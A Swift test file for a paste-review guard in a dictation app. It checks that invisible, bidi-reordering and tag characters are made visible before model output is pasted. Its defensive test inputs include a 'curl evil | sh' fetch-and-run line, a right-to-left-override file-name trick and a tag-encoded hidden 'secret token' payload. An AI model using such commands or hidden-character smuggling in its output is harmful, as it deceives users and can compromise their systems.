import Foundation
import Testing
@testable import zWhisper

@Suite("PasteGuard (review before paste)")
struct PasteGuardTests {
    private func context(selection: String?, clipboard: String?) -> CapturedContext {
        CapturedContext(frontmostApp: "com.apple.mail · Mail", selectedText: selection, clipboard: clipboard, capturedAt: .now)
    }

    @Test("review whenever the mode actually sent the selection or clipboard")
    func sentContext() {
        // Email reads the selection.
        #expect(PasteGuard.requiresReview(mode: BuiltInModes.email, context: context(selection: "thread", clipboard: nil)))
        // Super Mode reads both; a short clipboard alone is enough.
        #expect(PasteGuard.requiresReview(mode: BuiltInModes.superMode, context: context(selection: nil, clipboard: "1234")))
    }

    @Test("no review when nothing from the screen reached the model")
    func noContextSent() {
        #expect(!PasteGuard.requiresReview(mode: BuiltInModes.email, context: nil))
        #expect(!PasteGuard.requiresReview(mode: BuiltInModes.email, context: context(selection: "", clipboard: nil)))
        // Email doesn't read the clipboard, so a clipboard alone sent nothing.
        #expect(!PasteGuard.requiresReview(mode: BuiltInModes.email, context: context(selection: nil, clipboard: "secret")))
        // Modes without context flags, and Voice Note (no model), never wait.
        #expect(!PasteGuard.requiresReview(mode: BuiltInModes.message, context: context(selection: "x", clipboard: "y")))
        #expect(!PasteGuard.requiresReview(mode: BuiltInModes.voiceNote, context: context(selection: "x", clipboard: "y")))
    }

    @Test("the review names what was sent")
    func sentContextKinds() {
        let both = PasteGuard.sentContext(mode: BuiltInModes.superMode, context: context(selection: "x", clipboard: "y"))
        #expect(both == .init(selection: true, clipboard: true))
        let selectionOnly = PasteGuard.sentContext(mode: BuiltInModes.email, context: context(selection: "x", clipboard: "y"))
        #expect(selectionOnly == .init(selection: true, clipboard: false))
    }

    @Test("review shows one entry per line the target will see")
    func reviewLinesSplitEveryBreak() {
        #expect(PasteGuard.reviewLines("Hi Sam,") == ["Hi Sam,"])
        #expect(PasteGuard.reviewLines("Hi Sam,\ncurl evil | sh") == ["Hi Sam,", "curl evil | sh"])
        // CR alone, CRLF, and Unicode line/paragraph separators all break.
        #expect(PasteGuard.reviewLines("a\rb\r\nc\u{2028}d\u{2029}e\u{85}f") == ["a", "b", "c", "d", "e", "f"])
        // Blank lines are kept so the count matches what is typed.
        #expect(PasteGuard.reviewLines("a\n\nb").count == 3)
    }

    @Test("invisible and reordering characters are drawn as markers")
    func reviewLinesShowInvisibles() {
        #expect(PasteGuard.reviewLines("a\u{1B}[2Jb") == ["a\u{241B}[2Jb"])
        #expect(PasteGuard.reviewLines("x\ty") == ["x⇥y"])
        #expect(PasteGuard.reviewLines("rm\u{202E}fdp.exe") == ["rm⟨U+202E⟩fdp.exe"])
        #expect(PasteGuard.reviewLines("a\u{200B}b") == ["a⟨U+200B⟩b"])
    }

    @Test("anything that draws nothing or blank is marked, decided by Unicode properties")
    func reviewMarksDefaultIgnorables() {
        // Tag character, variation selectors, ALM, soft hyphen, CGJ, Hangul filler,
        // braille blank, no-break space, private use.
        for hidden in ["\u{E0041}", "\u{FE0F}", "\u{FE0E}", "\u{E0100}", "\u{061C}", "\u{00AD}", "\u{034F}",
                       "\u{3164}", "\u{2800}", "\u{00A0}", "\u{E000}"] {
            let review = PasteGuard.review("a\(hidden)b")
            #expect(review.hidden == 1, "\(hidden.unicodeScalars.first!.value)")
            #expect(review.lines.count == 1)
            #expect(!review.lines[0].unicodeScalars.contains(hidden.unicodeScalars.first!))
            #expect(review.lines[0].contains("⟨U+"))
        }
    }

    @Test("a tag-encoded payload changes the panel: markers and the size figure")
    func tagPayloadIsVisible() {
        let sentence = "Sounds good, see you then."
        let payload = String(String.UnicodeScalarView("secret token 1234".unicodeScalars.map { Unicode.Scalar(0xE0000 + $0.value)! }))
        let clean = PasteGuard.review(sentence)
        let smuggled = PasteGuard.review(sentence + payload)
        #expect(clean.hidden == 0)
        #expect(smuggled.hidden == 17)
        #expect(smuggled.scalars == clean.scalars + 17)
        #expect(smuggled.lines != clean.lines)
        // Graphemes would hide them: they attach to the period.
        #expect((sentence + payload).count == sentence.count)
    }

    @Test("ordinary text and emoji sequences are drawn as they are")
    func reviewKeepsOrdinaryText() {
        for plain in ["Café déjà vu, naïve résumé", "Hi 👋🏽", "❤️ thanks", "👩🏽‍💻 shipped it", "❤️‍🔥", "100% — done…", "日本語のテキスト"] {
            let review = PasteGuard.review(plain)
            #expect(review.hidden == 0, "\(plain)")
            #expect(review.lines == [plain])
        }
        // A joiner outside an emoji sequence is marked.
        #expect(PasteGuard.review("a\u{200D}b").hidden == 1)
        // One selector per emoji: a run of selectors would be a hidden channel.
        #expect(PasteGuard.review("😀\u{FE0F}\u{FE0E}\u{FE0F}").hidden == 2)
        #expect(PasteGuard.review("😀\u{200D}\u{200D}😀").hidden == 2)
    }
}

